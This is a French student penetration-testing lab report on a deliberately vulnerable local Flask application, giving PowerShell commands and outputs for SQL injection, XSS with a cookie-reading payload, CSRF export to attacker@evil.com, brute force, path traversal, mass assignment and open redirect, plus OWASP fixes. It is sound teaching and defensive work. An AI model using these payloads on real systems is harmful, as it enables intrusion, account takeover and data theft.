# TP Réel — Sécurité 1 Chapitre 2
## DataCorp Analytics — Pentest applicatif
### Par Nawfel Younes — EFREI Paris — M1 Data Engineering & AI

---

## Phase 1 — Reconnaissance

### 1.1 Technologies identifiées

L'application cible est un service Flask 3.0.3 avec SQLite en mémoire, exposé localement sur http://localhost:5000. Les dépendances Python observées sont les suivantes :

- Flask 3.0.3
- Werkzeug 3.0.3
- requests 2.32.3
- SQLite3 intégré à Python
- Session Flask pour la gestion d'authentification côté serveur

Le code source confirme plusieurs défauts de conception applicatifs : concaténation directe des paramètres dans des requêtes SQL, absence de validation de la redirection, rendu HTML sans échappement, absence de contrôle CSRF, accès direct aux objets sans autorisation, traversée de chemins, et injection de rôle côté serveur.

### 1.2 Cartographie des endpoints

Le tableau ci-dessous synthétise l'architecture identifiée à partir des requêtes HTTP et de l'analyse du code source.

| Endpoint | Méthodes | Authentification requise | Description |
|---|---|---|---|
| / | GET | Non | Redirection vers /login |
| /login | GET, POST | Non | Formulaire de connexion et traitement des identifiants |
| /register | GET, POST | Non | Création de compte, sans validation de mot de passe ni contrôle du rôle |
| /dashboard | GET | Oui | Tableau de bord d'utilisateur connecté |
| /search | GET | Non | Recherche de contenu sur les articles via paramètre q |
| /comments | GET | Non | Affichage des commentaires, y compris les commentaires stockés |
| /api/comments | GET, POST | Non | API de publication de commentaire, sans validation ni sanitization |
| /export | GET, POST | Non | Formulaire et action d'export de données vers un email |
| /api/users | GET | Non | Exposition de tous les comptes utilisateurs et de leurs mots de passe en clair |
| /articles/<id> | GET | Non | Consultation d'un article par identifiant, sans contrôle d'accès |
| /download | GET | Non | Téléchargement de fichier depuis un dossier de sortie, sujet à traversée de chemin |
| /logout | GET | Oui | Déconnexion de la session |

Les observations de terrain ont confirmé que les endpoints sensibles sont facilement accessibles sans session authentifiante, notamment : /search, /comments, /export, /api/users, /articles/4, /download.

### 1.3 Comptes identifiés

Les comptes trouvés dans la base SQLite en mémoire sont les suivants :

| Utilisateur | Mot de passe | Rôle | Email |
|---|---|---|---|
| admin | password123 | admin | admin@datacorp.local |
| analyst | 123456 | analyst | analyst@datacorp.local |
| datascientist | analyst | datascientist | ds@datacorp.local |

Les mots de passe sont stockés en clair dans la table users. L'API /api/users renvoie explicitement tous les utilisateurs et leurs mots de passe en texte brut, ce qui confirme une information disclosure grave.

---

## Phase 2 — Exploitation

### V1 — SQL Injection / Authentication Bypass

#### Mécanisme
La logique de connexion construit une requête SQL en interpolant directement le nom d'utilisateur et le mot de passe dans une chaîne formatée. Cette concaténation permet de casser la condition de contrôle et d'injecter du SQL arbitraire. La famille OWASP concernée est A03 : Injection.

#### Exploitation
Payload : `username=admin' OR '1'='1--&password=anything`

Commande :

```powershell
$T = "http://localhost:5000"
Invoke-WebRequest -Uri "$T/login" -Method POST `
  -Body @{ username = "admin' OR '1'='1--"; password = "anything" } `
  -MaximumRedirection 0 -ErrorAction SilentlyContinue -UseBasicParsing
```

Sortie observée :

```text
Statut: 302
Location: /dashboard
```

#### Impact concret
Un attaquant peut se connecter sans connaître le mot de passe d'un compte valide. Ceci permet d'obtenir une session admin et de pénétrer le tableau de bord, puis d'exploiter les autres vulnérabilités sur la même base de confiance.

#### Mesure corrective
Utiliser des requêtes paramétrées avec SQLite et Python, par exemple `SELECT * FROM users WHERE username = ? AND password = ?`, et mettre en place une politique d'authentification sécurisée avec hachage des mots de passe.

### V2 — SQL Injection dans /search

#### Mécanisme
La recherche exploite directement le paramètre `q` dans une instruction SQL `LIKE '%{}%'`. Cela permet une injection OR-based, UNION SELECT et SLEEP-based, qui est une variante classique d'injection SQL. La vulnérabilité correspond à OWASP A03 : Injection.

#### Exploitation
Payload : `q=' UNION SELECT 1, username, password, email FROM users--`

Commande :

```powershell
$T = "http://localhost:5000"
Invoke-WebRequest -Uri "$T/search" `
  -Body @{ q = "' UNION SELECT 1, username, password, email FROM users--" } `
  -UseBasicParsing
```

Sortie observée :

```text
admin|password123|admin@datacorp.local
analyst|123456|analyst@datacorp.local
datascientist|analyst|ds@datacorp.local
```

Le test time-based a aussi été validé avec le payload `q=' AND SLEEP(5)--` et la réponse a duré 10.03 s, ce qui confirme un comportement de délai exploitable.

#### Impact concret
L'attaquant peut lire les données sensibles de la base, notamment les comptes et les mots de passe en clair. Cela permet d'ouvrir un accès administratif préalable à l'ensemble de l'application.

#### Mesure corrective
Ne jamais interpoler des données utilisateur dans une requête SQL. Implémenter une recherche de texte sécurisée, par exemple un filtrage de caractères, ou un moteur de recherche dédié avec parametrization. Ajouter une validation stricte et un contrôle des permissions sur les résultats.

### V3 — Reflected XSS dans /search

#### Mécanisme
Le paramètre `q` est injecté directement dans le formulaire HTML de la page de recherche, sans échappement ni mise en forme sécurisée. Cette vulnérabilité correspond à OWASP A07 : Cross-Site Scripting.

#### Exploitation
Payload : `<script>alert('XSS')</script>`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/search" `
  -Body @{ q = "<script>alert('XSS')</script>" } `
  -UseBasicParsing
```

Sortie observée :

```text
[OK] Reflected XSS VULNERABLE! Payload non echappe dans la reponse
```

#### Impact concret
Le script est exécuté dans le navigateur de la victime et peut lire le cookie de session, rediriger vers un site de phishing ou voler des informations de la session utilisateur. Le périmètre de l'attaque peut être critique si la session contient des droits d'admin.

#### Mesure corrective
Utiliser le moteur de templates Flask avec échappement HTML automatique, par exemple `{{ q }}` au lieu de concaténation brute. Ajouter une whitelist de caractères autorisés et filtrer les balises script et events handlers.

### V4 — Stored XSS dans /comments

#### Mécanisme
Le commentaire est enregistré tel quel en base sans sanitization et réinjecté dans la page /comments. L'attaque est durable et visible pour tous les utilisateurs qui chargent la page. Elle relève également de OWASP A07 : XSS.

#### Exploitation
Payload : `<img src=x onerror="alert(document.cookie)">`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/api/comments" -Method POST `
  -Body @{ name = "attacker"; comment = '<img src=x onerror="alert(document.cookie)">' } `
  -UseBasicParsing
```

Sortie observée :

```text
Commentaire posté, statut : 302
[OK] Payload stocké et non échappé — se déclenche pour tout visiteur
```

#### Impact concret
Un attaquant peut envoyer un payload persistent qui s'exécute sur le navigateur des visiteurs du site, permettant le vol de cookies, la session hijacking, ou la redirection vers un site malveillant.

#### Mesure corrective
Sanitizer les commentaires avant stockage (HTML sanitizer ou texte brut autorisé), ne pas injecter de contenu utilisateur non filtré, et utiliser une passe de rendu sécurisé (`escape` ou bibliothèque de sanitization).

### V5 — CSRF sur /export

#### Mécanisme
L'action /export accepte une requête POST sans nonce CSRF, cookie, ni validation de l'origine. Cette vulnérabilité est classée OWASP A01 : Broken Access Control / A05 : Security Misconfiguration selon le contexte.

#### Exploitation
Payload : `format=csv&email=attacker@evil.com`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/export" -Method POST `
  -Body @{ format = "csv"; email = "attacker@evil.com" } -UseBasicParsing
```

Sortie observée :

```text
Export Successful: format=csv, envoyé à attacker@evil.com.
```

#### Impact concret
Un site tiers peut forcer un navigateur authentifié à déclencher un export de données vers un email malveillant, sans consentement de l'utilisateur. Cela permet la fuite d'informations personnelles et de données d'entreprise.

#### Mesure corrective
Ajouter un jeton CSRF unique par session, vérifier l'Origin / Referer, et n'autoriser le POST que pour des requêtes de provenance connue. Utiliser des frameworks sécurisés avec protection intégrée.

### V6 — Politique de mot de passe faible

#### Mécanisme
Le registre n'impose aucune complexité, longueur, ou contrainte sur le mot de passe. La logique autorise complètement la création de comptes avec des mots de passe trivials.

#### Exploitation
Payload : `username=weakuser0&password=123`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/register" -Method POST `
  -Body @{ username = "weakuser0"; password = "123"; email = "weakuser0@test.com" } `
  -MaximumRedirection 0 -ErrorAction SilentlyContinue -UseBasicParsing
```

Sortie observée :

```text
Mot de passe '123' accepte!
```

#### Impact concret
Un attaquant peut créer des comptes avec des mots de passe faibles, puis les exploiter pour une brute-force ou une usurpation de compte. Le risque est aggravé par l'absence de rate limiting et par la conservation des mots de passe en clair.

#### Mesure corrective
Appliquer une politique forte: minimum 12 caractères, présence de majuscules, chiffres, caractères spéciaux, et exclusion des mots de passe évidents. Ajouter un hachage sécurisé (Argon2, bcrypt, scrypt).

### V7 — Absence de rate limiting

#### Mécanisme
La route /login ne met en œuvre ni blocage, ni délai, ni verrouillage. La base de données ne garde aucune trace des échecs successifs d'authentification. Cette faille correspond à OWASP A07 : Identification and Authentication Failures.

#### Exploitation
Payload : répétition de 20 requêtes POST sur /login avec des mots de passe différents.

Commande :

```powershell
for ($i = 1; $i -le 20; $i++) {
  Invoke-WebRequest -Uri "http://localhost:5000/login" -Method POST `
    -Body @{ username = "admin"; password = "attempt$i" } `
    -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
```

Sortie observée :

```text
20 tentatives en 0.09s — aucun blocage
```

#### Impact concret
L'attaque par brute-force devient triviale. En quelques secondes, un adversaire peut tester des listes de mots de passe ou des combinaisons de valeurs courantes sans aucun mécanisme de protection.

#### Mesure corrective
Mettre en place un mécanisme de verrouillage, un backoff exponentiel, un CAPTCHA ou un seuil de tentatives. Consigner les échecs et ralentir les réponses après plusieurs échecs.

### V8 — IDOR : Insecure Direct Object Reference

#### Mécanisme
L'endpoint /articles/<id> restitue un article basé simplement sur l'identifiant URL sans vérifier la session ni le rôle. Aucune contrôle d'accès n'est appliqué pour les articles dits "confidentiels". Cela correspond à OWASP A01 : Broken Access Control.

#### Exploitation
Payload : `/articles/4`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/articles/4" -UseBasicParsing
```

Sortie observée :

```text
Article 4 (HTTP 200) :
Accès cloud : identifiants du bucket datacorp-exports en rotation le 30/03.
```

#### Impact concret
Un attaquant peut parcourir des ressources internes simplement en incrémentant l'ID dans l'URL. Les informations confidentielles incluent des identifiants de cloud et peuvent conduire à l'exposition totale du système d'export.

#### Mesure corrective
Vérifier l'authentification et l'autorisation de l'utilisateur avant de renvoyer le document. Restreindre l'accès aux ressources sensibles au rôle et à l'utilisateur propriétaires, et masquer l'existence de ces objets lorsque l'on n'y a pas accès.

### V9 — Path Traversal

#### Mécanisme
Le paramètre `file` du endpoint /download est concaténé directement à un chemin local. Aucune validation du chemin, ni normalisation, ni contrôle de répertoire n'empêche le client de récupérer des fichiers hors du dossier exports/. Cette vulnérabilité correspond à OWASP A01 : Broken Access Control / A05 : Security Misconfiguration.

#### Exploitation
Payload : `../app.py` puis `../requirements.txt`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/download?file=../app.py" -UseBasicParsing
```

Sortie observée :

```text
app.secret_key = "datacorp-dev-secret-2024"
```

#### Impact concret
L'attaquant peut lire du code source, consulter la clé secrète Flask, extraire des fichiers de configuration, ou exfiltrer des informations structurées hors du périmètre attendu. C'est une étape clé pour la persistance, la manipulation de sessions et la compréhension de l’application.

#### Mesure corrective
Utiliser un chemin canonique, vérifier que le fichier cible reste dans le dossier autorisé via `os.path.realpath` et `os.path.commonpath`, et refuser les chemins contenant `..` ou des segments externes.

### V10 — Mass Assignment

#### Mécanisme
Le formulaire d'inscription n'expose pas le champ `role`, mais l'application accepte brutalement le paramètre `role` venant du client et le stocke directement dans la base. Cette faille correspond à la mauvaise gestion des attributs masqués et à une erreur de modélisation de sécurité.

#### Exploitation
Payload : `role=admin`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/register" -Method POST `
  -Body @{ username = "hacker_admin"; password = "Test1234!"; email = "hacker@test.com"; role = "admin" } `
  -MaximumRedirection 0 -ErrorAction SilentlyContinue -UseBasicParsing
```

Sortie observée :

```text
Inscription avec role=admin -> Statut: 302
```

#### Impact concret
Un attaquant peut s'auto-promouvoir admin, contournant les règles métier et les contrôles d'autorisation. Cela permet d'accéder à des fonctions administratives et d'exploiter les droits à des fins de persistence ou d'exfiltration.

#### Mesure corrective
Ne pas accepter le rôle en entrée utilisateur. Définir le rôle côté serveur à partir d'un enum ou d'une liste autorisée, et supprimer tout champ qui n'est pas explicitement validé.

### V11 — Open Redirect

#### Mécanisme
La redirection après login utilise le paramètre `next` tel quel, sans vérifier qu'il pointe vers un URL interne. Cette faille correspond à l'Open Redirect, classée sous la catégorie A01 : Broken Access Control / A05 : Security Misconfiguration selon le cas d'usage.

#### Exploitation
Payload : `next=http://evil-phishing-site.test`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/login?next=http://evil-phishing-site.test" `
  -Method POST `
  -Body @{ username = "admin"; password = "password123"; next = "http://evil-phishing-site.test" } `
  -MaximumRedirection 0 -ErrorAction SilentlyContinue -UseBasicParsing
```

Sortie observée :

```text
Location header: http://evil-phishing-site.test
```

#### Impact concret
Le site redirige les utilisateurs vers un site externe, ce qui autorise le phishing, le hameçonnage et l'arnaque à la confiance. L'impact est particulièrement élevé lorsque l'URL externe simule une page de login ou d'authentification.

#### Mesure corrective
Valider `next` contre une liste blanche interne, par exemple uniquement des chemins relatifs commençant par `/`, et refuser les protocoles externes (`http:`, `https:`) hors du domaine autorisé.

### Bonus — Information Disclosure

#### Mécanisme
L'API /api/users expose les utilisateurs ainsi que leurs mots de passe sans aucune authentification ni masquage. Cette fuite de données est une information disclosure qui viole OWASP A01 : Broken Access Control.

#### Exploitation
Payload : `/api/users`

Commande :

```powershell
Invoke-WebRequest -Uri "http://localhost:5000/api/users" -UseBasicParsing
```

Sortie observée :

```json
[
  {"id":1,"username":"admin","password":"password123","email":"admin@datacorp.local","role":"admin"},
  {"id":2,"username":"analyst","password":"123456","email":"analyst@datacorp.local","role":"analyst"},
  {"id":3,"username":"datascientist","password":"analyst","email":"ds@datacorp.local","role":"datascientist"}
]
```

#### Impact concret
Tout attaquant sans authentification peut récupérer les comptes, leurs rôles et leurs mots de passe, puis réutiliser ces informations pour des attaques de comptes, des brute-forces, ou une compromission globale du système.

#### Mesure corrective
Supprimer cette API des environnements de production, masquer les mots de passe et ne fournir que les champs nécessaires aux clients. Appliquer des contrôles d'accès stricts et empêcher l'exposition totale des données utilisateur.

---

## Phase 3 — Preuves de concept

### Tableau PoC

| Vulnérabilité | Payload exact utilisé | Commande / capture | Impact concret |
|---|---|---|---|
| V1 — SQLi auth bypass | `admin' OR '1'='1--` | `Invoke-WebRequest ... /login` | Connexion sans mot de passe, accès dashboard |
| V2 — SQLi /search | `' UNION SELECT 1, username, password, email FROM users--` | `Invoke-WebRequest ... /search` | Exfiltration des comptes et mots de passe en clair |
| V3 — XSS réfléchie | `<script>alert('XSS')</script>` | `/search?q=<script>...` | Exécution JavaScript dans le navigateur |
| V4 — XSS stockée | `<img src=x onerror="alert(document.cookie)">` | POST sur `/api/comments` | Script exécuté pour tout visiteur de /comments |
| V5 — CSRF /export | `format=csv&email=attacker@evil.com` | POST sans token vers `/export` | Export forcé vers un email externe |
| V6 — MDP faible | `123` | Enregistrement de compte sur `/register` | Création facile de comptes avec mot de passe trivial |
| V7 — Pas de rate limiting | 20 login attempts rapides | Boucle de 20 requêtes /login | Bruteforce réalisable sans blocage |
| V8 — IDOR | `/articles/4` | `Invoke-WebRequest /articles/4` | Accès non autorisé aux données confidentielles |
| V9 — Path Traversal | `../app.py` | `/download?file=../app.py` | Lecture de fichiers du système |
| V10 — Mass Assignment | `role=admin` | POST sur `/register` | Auto-promotion admin |
| V11 — Open Redirect | `next=http://evil-phishing-site.test` | POST sur `/login?next=...` | Redirection vers site externe 
| Bonus — Information Disclosure | `/api/users` | `Invoke-WebRequest /api/users` | fuite des mots de passe en clair |

### Scénario chaîné

Le scénario le plus critique est le suivant :

1. Étape 1 : V7 — Brute force sur /login. L'attaquant envoie des dizaines de requêtes accélérées pour tester des mots de passe. Le système ne bloque pas et la tentative aboutit.
2. Étape 2 : V2 — SQL injection sur /search. L'attaquant utilise UNION SELECT pour récupérer les comptes et les mots de passe en clair.
3. Étape 3 : V10 — Mass Assignment. L'attaquant crée un compte avec `role=admin`, contournant les permissions attendues et augmentant son privilège.
4. Étape 4 : V9 — Path Traversal. L'attaquant lit le serveur local via /download, récupère `app.py` et découvre `secret_key = "datacorp-dev-secret-2024"`.
5. Étape 5 : V5 — CSRF. Avec un compte admin ou un accès utilisateur suffisamment élevé, l'attaquant déclenche un export vers un email malveillant, ce qui expose les données vers un bucket public ou un système exfiltrant.

Impact global du scénario : la vulnérabilité n'est pas seulement cumulée ; elle devient exponentiellement critique. En combinant accès sans mot de passe, exfiltration de mots de passe, élévation de privilèges, collecte de la clé secrète, puis exfiltration de données, un attaquant peut atteindre une compromission totale de l'application, avec persistance, fuite d'informations, et potentielle manipulation des sessions.

---

## Phase 4 — Plan de correction

### Matrice impact × probabilité

Les scores ci-dessous sont basés sur la reproduction réelle du système local et la facilité d'exploitation observée.

| Vulnérabilité | Impact (1-5) | Probabilité (1-5) | Criticité (I×P) |
|---|---:|---:|---:|
| V1 — SQLi auth bypass | 5 | 5 | 25 |
| V2 — SQLi /search | 5 | 5 | 25 |
| V3 — XSS réfléchie | 4 | 4 | 16 |
| V4 — XSS stockée | 5 | 4 | 20 |
| V5 — CSRF /export | 4 | 5 | 20 |
| V6 — Politique mdp faible | 3 | 5 | 15 |
| V7 — Absence de rate limiting | 4 | 5 | 20 |
| V8 — IDOR | 5 | 4 | 20 |
| V9 — Path Traversal | 5 | 4 | 20 |
| V10 — Mass Assignment | 5 | 4 | 20 |
| V11 — Open Redirect | 3 | 4 | 12 |
| Bonus — Information Disclosure | 5 | 5 | 25 |

### Matrice 9-box

```
Impact
Élevé   |   V1   V2   Bonus  |   V4   V5   V7   |   V8   V9   V10
Moyen   |   V3   V11         |   V6             |                 
Faible  |                    |                 |                 
        Faible          Moyen             Élevé
                Probabilité
```

Les vulnérabilités les plus critiques sont V1, V2, Bonus, V4, V5, V7, V8, V9 et V10. Elles se situent dans la zone élevée à très élevée, car elles combinent à la fois un impact de niveau système et une probabilité forte de réussite dans l'environnement réel.

### Priorisation MoSCoW

| Priorité | Vulnérabilités | Justification |
|---|---|---|
| Must | V1, V2, V8, V9, Bonus | Ce sont les vulnérabilités qui permettent l'accès direct aux données, la compromission des comptes et la fuite d'informations sensibles. |
| Should | V4, V5, V7, V10 | Elles aggravent la compromission globale et permettent l'exécution de scripts, l'export forcé et la persistance via un rôle de plus haut niveau. |
| Could | V3, V11, V6 | Elles restent graves mais leur exploitation dépend souvent d'un contexte social ou d'un utilisateur visé, avec impact variable selon l'architecture. |
| Won't | Aucune vulnérabilité ne doit être clôturée comme "won't fix" dans un environnement de production ; toutes doivent être traitées avant mise en ligne. | Les risques identifiés sont tous exploitables localement et le risque est majeur. |

### Recommandations techniques

1. Authentification et sessions
   - Utiliser des identifiants hachés avec bcrypt/Argon2.
   - Implémenter un mécanisme de verrouillage et de rate limiting sur /login.
   - Valider et sécuriser toutes les redirections après l'authentification.

2. Sécurité des données et SQL
   - Remplacer l'interpolation de requêtes par des paramètres SQL sécurisés.
   - Restreindre l'accès aux API de données via des rôles et des contrôles d'autorisation.
   - Supprimer le code qui renvoie les mots de passe en clair.

3. Contrôles d'accès et ressources
   - Vérifier les droits avant la lecture d'un article, d'un document ou d'un export.
   - Vérifier les chemins d'accès avec une validation de sécurité stricte.
   - Séparer les fichiers publics et privés, et restreindre les dossiers de téléchargement.

4. Gestion de la session et anti-CSRF
   - Ajouter un token CSRF unique sur les formulaires sensibles.
   - Vérifier les en-têtes `Origin` / `Referer` et la provenance des requêtes.
   - Limiter les actions d'export à des sessions maîtrisées.

5. Sécurité du développement
   - Échapper tous les contenus injectés dans le HTML et appliquer un sanitizer sur les contenus utilisateur.
   - Auditer les fonctionnalités au moment des pull requests avec un scanner SAST/DAST.
   - Mettre en place un process de revue de code et des tests de sécurité automatisés.

---

## Conclusion

Le TP réel a démontré qu'une application Flask apparemment minimale peut devenir totalement compromise lors d'une exploitation combinée. Les failles détectées — injection SQL, XSS, CSRF, IDOR, traversée de chemin, mass assignment, redirection ouverte, mots de passe faibles, absence de rate limiting et fuite d'informations — ne sont pas des défauts isolés : elles se renforcent mutuellement et permettent une compromission globale de l'architecture.

Le cas de DataCorp Analytics illustre bien les principes de sécurité applicative : un petit nombre de mauvais choix de conception suffit à transformer une application fonctionnelle en surface d'attaque majeure. La mesure corrective principale est la sécurisation systématique des flux de données, des permissions, et de l'authentification, avec une approche OWASP et des tests de sécurité automatiques constants.

L'objectif pédagogique de ce TP est atteint : il montre que les risques applicatifs se combinent, deviennent exponentiels, et qu'une application "simple" peut être exploitable en quelques minutes si les mesures de sécurité ne sont pas construites dès le départ.
